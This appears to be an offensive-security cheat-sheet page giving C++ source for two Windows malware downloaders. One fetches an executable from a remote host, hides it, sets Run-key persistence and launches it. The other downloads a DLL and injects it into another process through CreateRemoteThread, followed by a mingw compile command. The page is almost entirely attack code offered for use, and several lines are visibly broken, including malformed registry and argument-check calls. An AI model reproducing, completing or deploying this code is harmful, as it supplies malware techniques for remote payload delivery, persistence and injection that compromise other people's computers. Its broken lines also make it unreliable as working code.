# Downloader

## Download and Execute

```cpp
#include <iostream>
#include <windows.h>

void Persistence(LPCTSTR payload) {
    LPCTSTR executable = payload;
    DWORD dword_type = 0;
    DWORD dword_buffer_size = sizeof(executable);
    HKEY handle_key;

    if (ERROR_SUCCESS == ::RegCreateKeyEx(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0)) {
        ::RegSetValueEx(handle_key, executable, 0, REG_SZ, reinterpret_cast<const BYTE*>(&executable), sizeof(executable));
        ::RegCloseKey(handle_key);
    }
}

int main() {
    LPCTSTR payload_url = L"https://<IP>/payload.exe";
    LPCTSTR destination_file = L"C:\\ProgramData\\payload.exe";

    // Download the payload to it's destination
    ::URLDownloadToFile(0, payload_url, destination_file, 0, 0);

    // Make the payload hidden
    ::SetFileAttributes(destination_file, FILE_ATTRIBUTE_HIDDEN);

    Persistence(destination_file);

    // Execute the payload
    ::ShellExecute(NULL, L"open", destination_file, NULL, NULL, SW_SHOWNORMAL);

    return 0;
}
```

## Download and Inject Process

Another variant is to download the DLL payload and inject it to an existing process.

```cpp
#include <iostream>
#include <cstdlib>
#include <cstring>
#include <windows.h>
#include <libloaderapi.h>
#include <tlhelp32.h>
#include <wininet.h>

#pragma comment(lib, "wininet.lib")


char fileDLL[] = "C:\\path\\to\\shell.dll";
unsigned int fileLen = sizeof(fileDLL) + 1;

char *getFile() {
    HINTERNET hSession = InternetOpen((LPCSTR)"Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    HINTERNET hHttpFile = InternetOpenUrl(hSession, (LPCSTR)"http://<IP>/payload.dll", 0, 0, 0, 0);
    DWORD dwFileSize = 1024;
    char *buffer = new char[dwFileSize + 1];
    DWORD dwBytesRead;
    DWORD dwBytesWritten;
    HANDLE hFile = CreateFile("C:\\path\\to\\payload.dll",
			    GENERIC_READ | GENERIC_WRITE,
			    FILE_SHARE_READ,
			    NULL,
			    OPEN_ALWAYS,
			    FILE_ATTRIBUTE_NORMAL,
			    NULL
			);
    do {
        buffer = new char[dwFileSize + 1];
        ZeroMemory(buffer, sizeof(buffer));
        InternetReadFile(hHttpFile, (LPVOID)buffer, dwFileSize, &dwBytesRead);
        WriteFile(hFile, &buffer[0], dwBytesRead, &dwBytesWritten, NULL);
        delete[] buffer;
        buffer = NULL;
    } while(dwBytesRead);

    CloseHandle(hFile);
    InternetCloseHandle(hHttpFile);
    InternetCloseHandle(hSession);
    return buffer;
}

int main(int argc, char *argv[]) {
    HANDLE process_handle;
    HANDLE remote_thread;
    LPVOID remote_buffer;

    HMODULE hKernel32 = GetModuleHandle("kernel32");
    VOID *lb = GetProcAddress(hKernel32, "LoadLibraryA");
    char *file = getFile();

    if(atoi(argv[1] == 0)) {
        std::cout << "PID not found :( exiting..." << std::endl;
        return -1;
    }
    std::cout << "PID: " + atoi(argv[1]) + << std::endl;
    process_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));

    remote_buffer = VirtualAllocEx(process_handle, NULL, fileLen, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

    WriteProcessMemory(process_handle, remote_buffer, fileDLL, fileLen, NULL);

    remote_thread = CreateRemoteThread(process_handle, NULL, 0, (LPTHREAD_START_ROUTINE)lb, remote_buffer, 0, NULL);
    CloseHandle(process_handle);
    return 0;
}
```

Compile the payload.

```
$ x86_64-w64-mingw32-g++ -O2 download-inject-http.cpp -o payload.exe -mconsole \
-lwininet -I/usr/share/mingw-w64/include/ -s -ffunction-sections \
-fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants \
-static-libstdc++ -static-libgcc -fpermissive
```